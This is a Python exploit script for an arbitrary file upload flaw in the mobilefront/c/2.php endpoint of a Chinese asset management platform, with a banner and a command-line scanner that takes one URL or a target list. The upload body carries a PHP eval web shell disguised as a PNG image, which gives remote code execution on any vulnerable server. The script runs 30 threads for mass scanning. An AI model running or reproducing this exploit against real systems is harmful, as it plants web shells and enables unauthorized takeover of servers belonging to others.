import requests
import argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(url):
    target = f"{url}/mobilefront/c/2.php"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest'
    }
    data = '''-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="2.php"
Content-Type: image/png
 
<?php @eval($_POST[1]);unlink(__FILE__);?>
-----------------------------289666258334735365651210512949--'''
    try:
        r = requests.post(target, headers=headers, data=data, verify=False)
        if r.status_code == 200 and "2.php" in r.text:
            s = requests.get(target)
            if s.status_code ==200:
                print(f"{url}[*]存在漏洞")
        else:
            print(f"{url}[-]不存在漏洞")

    except Exception as e:
        print(f"{url}[-]超时")
if __name__ == '__main__':
    banner = """
     .----------------.  .----------------.  .----------------.  .----------------. 
    | .--------------. || .--------------. || .--------------. || .--------------. |
    | | ____    ____ | || |      __      | || |     _____    | || |  ___  ____   | |
    | ||_   \  /   _|| || |     /  \     | || |    |_   _|   | || | |_  ||_  _|  | |
    | |  |   \/   |  | || |    / /\ \    | || |      | |     | || |   | |_/ /    | |
    | |  | |\  /| |  | || |   / ____ \   | || |   _  | |     | || |   |  __'.    | |
    | | _| |_\/_| |_ | || | _/ /    \ \_ | || |  | |_' |     | || |  _| |  \ \_  | |
    | ||_____||_____|| || ||____|  |____|| || |  `.___.'     | || | |____||____| | |
    | |              | || |              | || |              | || |              | |
    | '--------------' || '--------------' || '--------------' || '--------------' |
    '----------------'  '----------------'  '----------------'  '----------------' 



    """
    print(banner)
    parse = argparse.ArgumentParser(description="百易云资产管理运营系统mobilefront/c/2.php存在任意文件上传漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(30)
if args.url:
    if "http" in args.url:
        poc(args.url)
    else:
        t2 = f"http://{args.url}"
        poc(t2)
        t3 = f"https://{args.url}"
        poc(t3)
elif args.file:
    f1 = open(args.file, 'r')
    targets = []
    for l in f1.readlines():
        l = l.strip()
        if "http" in l:
            target = f"{l}"
            targets.append(target)
        else:
            target = f"http://{l}"
            targets.append(target)
            target1 = f"https://{l}"
            targets.append(target1)
    pool.map(poc, targets)
    pool.close()
